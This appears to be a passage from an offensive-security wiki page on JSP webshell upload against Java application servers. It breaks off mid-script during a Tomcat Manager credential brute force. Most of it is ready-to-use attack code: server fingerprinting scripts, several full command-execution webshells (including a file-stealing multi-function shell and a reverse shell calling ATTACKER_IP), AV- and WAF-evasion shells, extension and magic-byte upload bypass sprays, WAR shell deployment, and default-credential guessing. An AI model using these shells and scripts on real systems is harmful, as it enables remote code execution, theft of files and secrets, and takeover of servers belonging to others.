---
title: JSP Webshell Upload
description: JSP Webshell Upload — Exploit Java Server File Upload for Remote Code Execution on Tomcat, JBoss, WebLogic & WildFly
navigation:
  icon: i-lucide-coffee
  title: JSP Webshell Upload
---

## JSP Webshell Upload


JSP (JavaServer Pages) webshells execute on Java application servers — Apache Tomcat, JBoss/WildFly, WebLogic, GlassFish, Jetty, and WebSphere. When an application running on these servers allows uploading `.jsp` files, or fails to restrict executable Java extensions, an attacker uploads server-side Java code that provides full operating system command execution, file system access, database interaction, and network pivoting capabilities.

::note
Java application servers present a unique attack surface compared to PHP or ASP.NET. JSP files are **compiled to Java servlets** on first request, meaning the first access is slower (compilation), but subsequent requests execute at native Java speed. This compilation step also means **compilation errors produce detailed stack traces** that leak server paths, Java version, library versions, and internal class names — valuable reconnaissance even when the shell itself doesn't work.
::

JSP exploitation differs from PHP in several critical ways: Java servers handle multiple executable extensions (`.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`), WAR file deployment can achieve RCE through archive upload, Tomcat's manager interface provides authenticated deployment, Expression Language injection offers an alternative to direct JSP upload, and Java deserialization vulnerabilities in the upload processing pipeline can be chained for additional attack vectors.

---

## Target Identification & Reconnaissance

### Detecting Java Application Servers

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Server Fingerprinting"}
  ```bash
  TARGET="https://target.com"

  echo "═══ Java Application Server Detection ═══"

  # ── HTTP Header Analysis ──
  echo "─── HTTP Headers ───"
  curl -sI "$TARGET" | grep -iE "^server:|^x-powered-by:|^x-application|^x-content-type|^set-cookie"
  # Look for:
  #   Server: Apache-Coyote/1.1          → Tomcat
  #   Server: Apache/2.4.x (with mod_jk) → Tomcat behind Apache
  #   Server: Jetty(9.x.x)               → Jetty
  #   Server: GlassFish Server            → GlassFish
  #   Server: WildFly/xx                  → WildFly (JBoss)
  #   Server: WebLogic Server             → Oracle WebLogic
  #   Set-Cookie: JSESSIONID=             → Java session (any Java server)

  # ── Session Cookie Analysis ──
  COOKIES=$(curl -sI "$TARGET" | grep -i "set-cookie")
  echo ""
  echo "─── Session Cookies ───"
  echo "$COOKIES" | grep -qi "JSESSIONID" && echo "[+] JSESSIONID found → Java application server confirmed"
  echo "$COOKIES" | grep -qi "JSESSIONIDSSO" && echo "[+] JSESSIONIDSSO → Tomcat SSO detected"
  echo "$COOKIES" | grep -qi "BIGipServer" && echo "[+] BIGipServer → F5 load balancer (may front Java)"

  # ── Error Page Analysis ──
  echo ""
  echo "─── Error Page Fingerprinting ───"
  ERROR_PAGE=$(curl -s "${TARGET}/nonexistent_probe_$$" 2>/dev/null)
  echo "$ERROR_PAGE" | grep -qi "apache tomcat" && echo "[+] Tomcat error page detected"
  echo "$ERROR_PAGE" | grep -qi "jetty" && echo "[+] Jetty error page detected"
  echo "$ERROR_PAGE" | grep -qi "glassfish" && echo "[+] GlassFish error page detected"
  echo "$ERROR_PAGE" | grep -qi "jboss\|wildfly" && echo "[+] JBoss/WildFly error page detected"
  echo "$ERROR_PAGE" | grep -qi "weblogic" && echo "[+] WebLogic error page detected"
  echo "$ERROR_PAGE" | grep -qi "websphere" && echo "[+] WebSphere error page detected"
  echo "$ERROR_PAGE" | grep -qiE "java\.lang\.|javax\.\|jakarta\." && echo "[+] Java stack trace in error page"

  # Extract version from error page
  echo "$ERROR_PAGE" | grep -oiE "(apache tomcat|jetty|glassfish|wildfly|jboss|weblogic|websphere)[/ ]*[0-9]+\.[0-9]+[^ <\"]*" | head -3

  # ── Common Java Server Paths ──
  echo ""
  echo "─── Common Paths ───"
  for path in \
      "/manager/html" "/manager/text" "/manager/status" \
      "/host-manager/html" \
      "/admin" "/admin/login.jsp" \
      "/console" "/console/login/LoginForm.jsp" \
      "/web-console" "/jmx-console" \
      "/invoker/JMXInvokerServlet" \
      "/status" "/jolokia" \
      "/actuator" "/actuator/env" "/actuator/health" \
      "/swagger-ui.html" "/api-docs" \
      "/j_security_check" \
      "/WEB-INF/" "/META-INF/" \
      "/.well-known/" \
      "/favicon.ico"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${path}" --max-time 5 2>/dev/null)
      case $STATUS in
          200) echo "  [200] ${path} ← ACCESSIBLE" ;;
          401|403) echo "  [${STATUS}] ${path} ← EXISTS (auth required)" ;;
          302) echo "  [302] ${path} ← REDIRECT (likely login)" ;;
      esac
  done

  # ── Detailed Technology Scan ──
  echo ""
  echo "─── Technology Scan ───"
  whatweb "$TARGET" -v 2>/dev/null | grep -iE "java|tomcat|jsp|servlet|jboss|wildfly|spring|struts|weblogic" | head -10
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Handler & Extension Detection"}
  ```bash
  TARGET="https://target.com"

  echo "═══ JSP Handler Detection ═══"
  echo "[*] Testing which Java extensions the server processes"
  echo ""

  for ext in jsp jspx jsw jsv jspf jhtml jsf xhtml do faces action; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/nonexistent_handler_test.${ext}" --max-time 5 2>/dev/null)
      case $STATUS in
          404) ;; # Standard — may or may not have handler
          403) echo "  [HANDLER] .${ext} → 403 (recognized, access denied)" ;;
          500) echo "  [HANDLER] .${ext} → 500 (tried to compile/execute)" ;;
          502|503) echo "  [HANDLER] .${ext} → ${STATUS} (backend error)" ;;
          200) echo "  [HANDLER] .${ext} → 200 (processed successfully)" ;;
          *) echo "  [?]       .${ext} → ${STATUS}" ;;
      esac
  done

  # ── Check for Tomcat version via specific URLs ──
  echo ""
  echo "─── Tomcat Version Detection ───"

  # Tomcat default pages
  for page in "/" "/index.jsp" "/RELEASE-NOTES.txt" "/docs/" "/examples/" \
               "/examples/jsp/num/numguess.jsp" "/examples/servlets/"; do
      BODY=$(curl -s "${TARGET}${page}" --max-time 5 2>/dev/null)
      VER=$(echo "$BODY" | grep -oiE "apache tomcat[/ ]*[0-9]+\.[0-9]+\.[0-9]+" | head -1)
      [ -n "$VER" ] && echo "  [+] Version detected via ${page}: ${VER}"
  done

  # Tomcat version via Server header on error
  VER=$(curl -sI "${TARGET}/nonexistent" 2>/dev/null | grep -oiP "Apache-Coyote/[\d.]+" | head -1)
  [ -n "$VER" ] && echo "  [+] Coyote version: ${VER}"
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Upload Endpoint Discovery"}
  ```bash
  TARGET="https://target.com"

  echo "═══ Java Upload Endpoint Discovery ═══"

  # ── Crawl for upload endpoints ──
  katana -u "$TARGET" -d 5 -jc -kf -ef css,woff,woff2,svg,ico,ttf -o java_crawl.txt 2>/dev/null
  grep -iE "upload|import|attach|file|media|image|document|deploy|install" java_crawl.txt | sort -u

  # ── Java-specific upload paths ──
  ffuf -u "${TARGET}/FUZZ" -mc 200,201,204,301,302,401,403,405 -t 30 -w <(cat << 'PATHS'
  upload
  upload.jsp
  fileupload
  FileUpload
  Upload
  api/upload
  api/v1/upload
  api/v2/upload
  api/files/upload
  api/media
  api/attachments
  admin/upload
  admin/deploy
  admin/install
  attachment/upload
  file/upload
  document/upload
  image/upload
  media/upload
  manager/html
  manager/text/deploy
  manager/deploy
  console
  jmx-console
  web-console
  invoker
  struts/upload
  spring/upload
  servlet/upload
  action/upload
  PATHS
  )

  # ── Check for Tomcat Manager (direct WAR deployment) ──
  echo ""
  echo "─── Tomcat Manager Access ───"
  for url in "/manager/html" "/manager/text" "/manager/status"; do
      RESP=$(curl -sI "${TARGET}${url}" --max-time 5 2>/dev/null)
      STATUS=$(echo "$RESP" | head -1 | awk '{print $2}')
      echo "  [${STATUS}] ${TARGET}${url}"
      if [ "$STATUS" = "401" ]; then
          echo "       → Authentication required — try default creds"
          echo "       → tomcat:tomcat, admin:admin, manager:manager"
          echo "       → tomcat:s3cret, admin:password, root:root"
      fi
  done

  # ── Check for PUT method (WebDAV or REST upload) ──
  echo ""
  echo "─── HTTP PUT Method Check ───"
  for path in "/uploads/test.txt" "/test.txt" "/api/files/test.txt"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "${TARGET}${path}" \
        -d "PUT_TEST_DATA" --max-time 5 2>/dev/null)
      [ "$STATUS" != "404" ] && [ "$STATUS" != "405" ] && echo "  [${STATUS}] PUT ${path}"
  done
  ```
  :::
::

---

## JSP Webshell Payloads

### Command Execution Shells

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Standard JSP Shells"}
  ```bash
  # ═══════════════════════════════════════════════
  # JSP Webshell Collection — From Minimal to Full-Featured
  # ═══════════════════════════════════════════════

  # ── Minimal one-liner (smallest possible JSP shell) ──
  cat > shell_minimal.jsp << 'EOF'
  <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
  EOF

  # ── Standard command shell with output (most reliable) ──
  cat > shell_cmd.jsp << 'JSPEOF'
  <%@ page import="java.util.*,java.io.*"%>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      out.println("<pre>");
      while ((line = br.readLine()) != null) {
          out.println(line);
      }
      out.println("</pre>");
      p.waitFor();
  }
  %>
  JSPEOF

  # ── Cross-platform shell (Linux + Windows) ──
  cat > shell_xplat.jsp << 'JSPEOF'
  <%@ page import="java.util.*,java.io.*"%>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
      String[] command;
      if (isWin) {
          command = new String[]{"cmd.exe", "/c", cmd};
      } else {
          command = new String[]{"/bin/bash", "-c", cmd};
      }
      Process p = Runtime.getRuntime().exec(command);
      Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A");
      String output = sc.hasNext() ? sc.next() : "";
      Scanner scErr = new Scanner(p.getErrorStream()).useDelimiter("\\A");
      String error = scErr.hasNext() ? scErr.next() : "";
      out.println("<pre>" + output + error + "</pre>");
      p.waitFor();
  } else {
      out.println("JSP Shell Active | OS: " + System.getProperty("os.name"));
      out.println(" | User: " + System.getProperty("user.name"));
      out.println(" | Usage: ?cmd=whoami");
  }
  %>
  JSPEOF

  # ── ProcessBuilder shell (avoids Runtime.exec string splitting issues) ──
  cat > shell_pb.jsp << 'JSPEOF'
  <%@ page import="java.util.*,java.io.*"%>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      ProcessBuilder pb;
      if (System.getProperty("os.name").toLowerCase().contains("win")) {
          pb = new ProcessBuilder("cmd.exe", "/c", cmd);
      } else {
          pb = new ProcessBuilder("/bin/bash", "-c", cmd);
      }
      pb.redirectErrorStream(true);
      Process p = pb.start();
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      StringBuilder sb = new StringBuilder();
      String line;
      while ((line = br.readLine()) != null) {
          sb.append(line).append("\n");
      }
      out.println("<pre>" + sb.toString() + "</pre>");
      p.waitFor();
  }
  %>
  JSPEOF

  echo "[+] Standard JSP shells created:"
  ls -la shell_*.jsp
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Advanced Feature Shell"}
  ```jsp
  <%-- shell_advanced.jsp — Multi-function JSP webshell --%>
  <%@ page import="java.util.*,java.io.*,java.net.*,java.sql.*" %>
  <%@ page import="javax.servlet.http.*" %>
  <%
  String action = request.getParameter("action");
  String param = request.getParameter("param");
  String param2 = request.getParameter("param2");

  response.setContentType("text/plain");

  if (action == null) {
      out.println("JSP Advanced Shell Active");
      out.println("OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version"));
      out.println("Java: " + System.getProperty("java.version"));
      out.println("User: " + System.getProperty("user.name"));
      out.println("Home: " + System.getProperty("user.home"));
      out.println("Path: " + application.getRealPath("/"));
      out.println("Server: " + application.getServerInfo());
      out.println("\nActions: cmd, ps, read, write, download, dir, env, props, upload, sql, net");
      return;
  }

  boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");

  switch (action) {
      case "cmd": {
          String[] cmd = isWin ? new String[]{"cmd.exe", "/c", param} : new String[]{"/bin/bash", "-c", param};
          ProcessBuilder pb = new ProcessBuilder(cmd);
          pb.redirectErrorStream(true);
          Process p = pb.start();
          Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A");
          out.println(sc.hasNext() ? sc.next() : "");
          p.waitFor();
          break;
      }
      case "ps": {
          String[] cmd = isWin
              ? new String[]{"powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", param}
              : new String[]{"/bin/bash", "-c", param};
          ProcessBuilder pb = new ProcessBuilder(cmd);
          pb.redirectErrorStream(true);
          Process p = pb.start();
          Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A");
          out.println(sc.hasNext() ? sc.next() : "");
          p.waitFor();
          break;
      }
      case "read": {
          File f = new File(param);
          if (f.exists()) {
              Scanner sc = new Scanner(f).useDelimiter("\\A");
              out.println(sc.hasNext() ? sc.next() : "");
          } else {
              out.println("File not found: " + param);
          }
          break;
      }
      case "write": {
          FileWriter fw = new FileWriter(param);
          fw.write(param2);
          fw.close();
          out.println("Written: " + param);
          break;
      }
      case "download": {
          File f = new File(param);
          if (f.exists()) {
              response.setContentType("application/octet-stream");
              response.setHeader("Content-Disposition", "attachment; filename=" + f.getName());
              FileInputStream fis = new FileInputStream(f);
              byte[] buf = new byte[4096];
              int len;
              while ((len = fis.read(buf)) > 0) {
                  response.getOutputStream().write(buf, 0, len);
              }
              fis.close();
              return;
          }
          break;
      }
      case "dir": {
          String dirPath = param != null ? param : application.getRealPath("/");
          File dir = new File(dirPath);
          if (dir.isDirectory()) {
              for (File f : dir.listFiles()) {
                  String type = f.isDirectory() ? "[DIR] " : "[FILE]";
                  out.println(type + " " + f.getName() + " (" + f.length() + " bytes)");
              }
          }
          break;
      }
      case "env": {
          for (Map.Entry<String, String> e : System.getenv().entrySet()) {
              out.println(e.getKey() + "=" + e.getValue());
          }
          break;
      }
      case "props": {
          Properties props = System.getProperties();
          for (String key : props.stringPropertyNames()) {
              out.println(key + "=" + props.getProperty(key));
          }
          break;
      }
      case "net": {
          Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
          while (nets.hasMoreElements()) {
              NetworkInterface ni = nets.nextElement();
              out.println(ni.getDisplayName() + ":");
              Enumeration<InetAddress> addrs = ni.getInetAddresses();
              while (addrs.hasMoreElements()) {
                  out.println("  " + addrs.nextElement().getHostAddress());
              }
          }
          break;
      }
      default:
          out.println("Unknown action: " + action);
  }
  %>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="JSPX Shell (XML Format)"}
  ```bash
  # JSPX is the XML syntax for JSP — different parser, different bypasses
  # Some filters block .jsp but allow .jspx

  cat > shell.jspx << 'JSPXEOF'
  <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
  <jsp:directive.page contentType="text/plain"/>
  <jsp:directive.page import="java.util.*,java.io.*"/>
  <jsp:scriptlet>
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
      String[] command = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/bash", "-c", cmd};
      ProcessBuilder pb = new ProcessBuilder(command);
      pb.redirectErrorStream(true);
      Process p = pb.start();
      java.util.Scanner sc = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
      out.println(sc.hasNext() ? sc.next() : "");
      p.waitFor();
  } else {
      out.println("JSPX Shell Active | " + System.getProperty("os.name") + " | " + System.getProperty("user.name"));
  }
  </jsp:scriptlet>
  </jsp:root>
  JSPXEOF

  echo "[+] shell.jspx created — XML-format JSP shell"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shell JSP"}
  ```bash
  ATTACKER_IP="10.10.14.1"
  ATTACKER_PORT="4444"

  cat > shell_reverse.jsp << JSPEOF
  <%@ page import="java.util.*,java.io.*,java.net.*" %>
  <%
  String host = "${ATTACKER_IP}";
  int port = ${ATTACKER_PORT};
  String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/bash";

  try {
      Socket socket = new Socket(host, port);
      Process process = Runtime.getRuntime().exec(shell);

      // Connect stdin/stdout/stderr to socket
      new Thread(() -> {
          try {
              InputStream pi = process.getInputStream();
              OutputStream so = socket.getOutputStream();
              byte[] buf = new byte[1024];
              int len;
              while ((len = pi.read(buf)) != -1) so.write(buf, 0, len);
          } catch (Exception e) {}
      }).start();

      new Thread(() -> {
          try {
              InputStream pe = process.getErrorStream();
              OutputStream so = socket.getOutputStream();
              byte[] buf = new byte[1024];
              int len;
              while ((len = pe.read(buf)) != -1) so.write(buf, 0, len);
          } catch (Exception e) {}
      }).start();

      new Thread(() -> {
          try {
              InputStream si = socket.getInputStream();
              OutputStream po = process.getOutputStream();
              byte[] buf = new byte[1024];
              int len;
              while ((len = si.read(buf)) != -1) { po.write(buf, 0, len); po.flush(); }
          } catch (Exception e) {}
      }).start();

      out.println("Connected to " + host + ":" + port);
  } catch (Exception e) {
      out.println("Connection failed: " + e.getMessage());
  }
  %>
  JSPEOF

  echo "[+] shell_reverse.jsp — connects back to ${ATTACKER_IP}:${ATTACKER_PORT}"
  echo "[*] Start listener: nc -lvnp ${ATTACKER_PORT}"
  ```
  :::
::

### Obfuscated & AV-Evasion Shells

::accordion
  :::accordion-item{icon="i-lucide-eye-off" label="Reflection-Based Shell"}
  ```jsp
  <%-- Uses Java Reflection to avoid static analysis detection --%>
  <%@ page import="java.lang.reflect.*" %>
  <%
  String c = request.getParameter("c");
  if (c != null) {
      // Get Runtime class via reflection (avoids "Runtime.getRuntime" signature)
      Class<?> rt = Class.forName("java.lang." + "Runtime");
      Method getRuntime = rt.getMethod("get" + "Runtime");
      Object runtime = getRuntime.invoke(null);

      // Build command array
      boolean w = System.getProperty("os.name").toLowerCase().contains("win");
      String[] cmd = w ? new String[]{"cmd.exe", "/c", c} : new String[]{"/bin/bash", "-c", c};

      // Execute via reflection
      Method exec = rt.getMethod("exec", String[].class);
      Object process = exec.invoke(runtime, (Object) cmd);

      // Read output via reflection
      Method getInput = process.getClass().getMethod("getInputStream");
      java.io.InputStream is = (java.io.InputStream) getInput.invoke(process);
      java.util.Scanner sc = new java.util.Scanner(is).useDelimiter("\\A");
      out.println("<pre>" + (sc.hasNext() ? sc.next() : "") + "</pre>");
  }
  %>
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="Base64-Encoded Command Shell"}
  ```jsp
  <%-- Accepts base64-encoded commands to bypass WAF signature detection --%>
  <%@ page import="java.util.*,java.io.*" %>
  <%
  String b = request.getParameter("b");
  if (b != null) {
      // Decode base64 command
      String cmd = new String(java.util.Base64.getDecoder().decode(b));
      boolean w = System.getProperty("os.name").toLowerCase().contains("win");
      ProcessBuilder pb = new ProcessBuilder(
          w ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/bash", "-c", cmd}
      );
      pb.redirectErrorStream(true);
      Process p = pb.start();
      Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A");
      out.println(sc.hasNext() ? sc.next() : "");
      p.waitFor();
  }
  %>
  <%-- Usage: ?b=d2hvYW1p (base64 of "whoami") --%>
  <%-- Encode: echo -n "id" | base64 → aWQ= --%>
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="ScriptEngine Shell (No Import)"}
  ```jsp
  <%-- Uses javax.script to execute — no suspicious imports needed --%>
  <%
  String c = request.getParameter("c");
  if (c != null) {
      javax.script.ScriptEngineManager mgr = new javax.script.ScriptEngineManager();
      javax.script.ScriptEngine engine = mgr.getEngineByName("js");
      // Nashorn (Java 8-14) or GraalJS can call Java classes
      String script = "var Runtime = Java.type('java.lang.Runtime');"
          + "var p = Runtime.getRuntime().exec(['/bin/bash','-c','" + c.replace("'", "\\'") + "']);"
          + "var sc = new (Java.type('java.util.Scanner'))(p.getInputStream()).useDelimiter('\\\\A');"
          + "sc.hasNext() ? sc.next() : '';";
      out.println("<pre>" + engine.eval(script) + "</pre>");
  }
  %>
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="Expression Language Shell (No Scriptlet)"}
  ```jsp
  <%-- Uses JSP Expression Language instead of scriptlets
       Bypasses filters that block <% tags --%>
  <%@ page contentType="text/html" %>
  ${Runtime.getRuntime().exec(param.cmd)}

  <%-- Alternative EL payloads: --%>
  <%-- ${pageContext.request.getSession().getServletContext().getRealPath("/")} --%>
  <%-- ${header} --%>
  <%-- ${applicationScope} --%>

  <%-- For output capture, use a helper: --%>
  <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
  <c:set var="cmd" value="${param.cmd}"/>
  ```
  :::
::

---

## Upload Bypass Techniques

### Extension & Content Bypass

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="JSP Extension Spray"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Standard JSP shell for testing
  cat > /tmp/jsp_test.txt << 'EOF'
  <%@ page import="java.util.*,java.io.*"%>
  <%out.println("JSP_BYPASS_TEST_" + System.getProperty("os.name"));%>
  EOF

  echo "═══ JSP Extension Spray ═══"

  # Direct JSP extensions
  echo "─── Direct Extensions ───"
  for ext in jsp jspx jsw jsv jspf jhtml; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/jsp_test.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # Case variations
  echo "─── Case Variations ───"
  for ext in JSP JsP Jsp jSP jSp jsP JSPX JsPx; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/jsp_test.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} CASE BYPASS"
  done

  # Double extensions
  echo "─── Double Extensions ───"
  for combo in jsp.jpg jpg.jsp jsp.png png.jsp jsp.gif jsp.txt \
               jspx.jpg jpg.jspx jspf.jpg; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/jsp_test.txt;filename=shell.${combo};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${combo} ACCEPTED"
  done

  # Trailing characters
  echo "─── Trailing Characters ───"
  for name in "shell.jsp." "shell.jsp%20" "shell.jsp%00" "shell.jsp%00.jpg" \
              "shell.jsp%0a" "shell.jsp;.jpg" "shell.jsp/" "shell.jsp%2f"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/jsp_test.txt;filename=${name};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
  done

  # Content-Type manipulation
  echo "─── Content-Type Manipulation ───"
  for ct in "image/jpeg" "image/png" "application/octet-stream" "text/plain" \
            "text/html" "application/x-jsp"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/jsp_test.txt;filename=shell.jsp;type=${ct}" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .jsp + CT:${ct} ACCEPTED"
  done

  rm -f /tmp/jsp_test.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="WAR File Deployment"}
  ```bash
  # ═══════════════════════════════════════════════
  # WAR files auto-deploy on Tomcat when placed in webapps/
  # Upload a WAR containing a JSP webshell
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  TARGET="https://target.com"

  # ── Create WAR with JSP shell ──
  mkdir -p /tmp/war_shell/WEB-INF

  # web.xml
  cat > /tmp/war_shell/WEB-INF/web.xml << 'XML'
  <?xml version="1.0" encoding="UTF-8"?>
  <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="4.0">
    <display-name>App</display-name>
  </web-app>
  XML

  # JSP shell
  cat > /tmp/war_shell/cmd.jsp << 'JSP'
  <%@ page import="java.util.*,java.io.*"%>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", cmd);
      pb.redirectErrorStream(true);
      Process p = pb.start();
      Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A");
      out.println("<pre>" + (sc.hasNext() ? sc.next() : "") + "</pre>");
      p.waitFor();
  } else {
      out.println("WAR Shell Active | " + System.getProperty("user.name"));
  }
  %>
  JSP

  # Package as WAR
  cd /tmp/war_shell && jar cf /tmp/shell.war * && cd -

  echo "[+] Created /tmp/shell.war"

  # ── Method 1: Upload via file upload endpoint ──
  curl -s -o /dev/null -w "[%{http_code}] WAR upload\n" -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/shell.war;filename=app.war;type=application/java-archive" \
    -H "Cookie: $COOKIE"

  # ── Method 2: Deploy via Tomcat Manager (if accessible) ──
  # Default credentials: tomcat:tomcat, admin:admin, manager:manager, tomcat:s3cret
  for cred in "tomcat:tomcat" "admin:admin" "manager:manager" "tomcat:s3cret" \
               "admin:password" "root:root" "admin:tomcat" "both:tomcat"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
        "${TARGET}/manager/text/deploy?path=/pwned&update=true" \
        -u "$cred" --upload-file /tmp/shell.war --max-time 10 2>/dev/null)
      if [ "$STATUS" = "200" ]; then
          echo "[!!!] Deployed via Manager with creds: ${cred}"
          echo "      Shell: ${TARGET}/pwned/cmd.jsp?cmd=id"
          break
      fi
  done

  # ── Method 3: PUT method deployment ──
  curl -s -o /dev/null -w "[%{http_code}] PUT WAR\n" -X PUT "${TARGET}/uploads/shell.war" \
    --upload-file /tmp/shell.war --max-time 10

  # ── Verify deployment ──
  echo ""
  echo "─── Checking WAR deployment ───"
  for app_path in "/pwned/" "/app/" "/shell/" "/uploads/shell/"; do
      for jsp_file in "cmd.jsp" "index.jsp"; do
          RESULT=$(curl -s "${TARGET}${app_path}${jsp_file}?cmd=echo+WAR_DEPLOYED" --max-time 5 2>/dev/null)
          if echo "$RESULT" | grep -q "WAR_DEPLOYED"; then
              echo "[!!!] WAR RCE: ${TARGET}${app_path}${jsp_file}?cmd=COMMAND"
          fi
      done
  done

  rm -rf /tmp/war_shell /tmp/shell.war
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Magic Bytes + JSP Content"}
  ```bash
  # ImageMagick and validators check magic bytes
  # Java servers execute based on extension handler, not content type

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  JSP_SHELL='<%@ page import="java.util.*,java.io.*"%><%String cmd=request.getParameter("cmd");if(cmd!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});Scanner sc=new Scanner(p.getInputStream()).useDelimiter("\\\\A");out.println(sc.hasNext()?sc.next():"");}%>'

  echo "═══ Magic Bytes + JSP Combination ═══"

  # JPEG magic + JSP
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > /tmp/magic.bin
  echo "$JSP_SHELL" >> /tmp/magic.bin

  for ext in jsp jspx jspf jsp.jpg jpg.jsp; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/magic.bin;filename=avatar.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] JPEG magic + .${ext} ACCEPTED"
  done

  # GIF magic + JSP
  echo -n "GIF89a${JSP_SHELL}" > /tmp/magic_gif.bin

  for ext in jsp jspx jspf; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/magic_gif.bin;filename=avatar.${ext};type=image/gif" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] GIF magic + .${ext} ACCEPTED"
  done

  # PNG magic + JSP
  printf '\x89PNG\r\n\x1a\n' > /tmp/magic_png.bin
  echo "$JSP_SHELL" >> /tmp/magic_png.bin

  for ext in jsp jspx jspf; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/magic_png.bin;filename=avatar.${ext};type=image/png" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] PNG magic + .${ext} ACCEPTED"
  done

  rm -f /tmp/magic.bin /tmp/magic_gif.bin /tmp/magic_png.bin
  ```
  :::
::

### Tomcat-Specific Exploitation

::tabs
  :::tabs-item{icon="i-lucide-server" label="Tomcat Manager Brute Force & Deploy"}
  ```bash
  TARGET="https://target.com"

  echo "═══ Tomcat Manager Exploitation ═══"

  # ── Credential Brute Force ──
  echo "─── Manager Credential Testing ───"

  CREDS=(
      "tomcat:tomcat" "admin:admin" "manager:manager"
      "tomcat:s3cret" "admin:password" "root:root"
      "admin:tomcat" "both:tomcat" "tomcat:changethis"
      "role1:tomcat" "admin:admin123" "tomcat:password"
      "admin:123456" "tomcat:tomcat1" "manager:s3cret"
      "deployer:deployer" "admin:manager" "tomcat:manager"
  )

  for cred in "${CREDS[@]}"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/manager/html" \
        -u "$cred" --max-time 5 2>/dev/null)
      if [ "$STATUS" = "200" ]; then
          echo "[!!!] VALID CREDENTIALS: ${cred}"
          echo ""

          # Deploy WAR shell
          echo "[*] Creating and deploying WAR shell..."
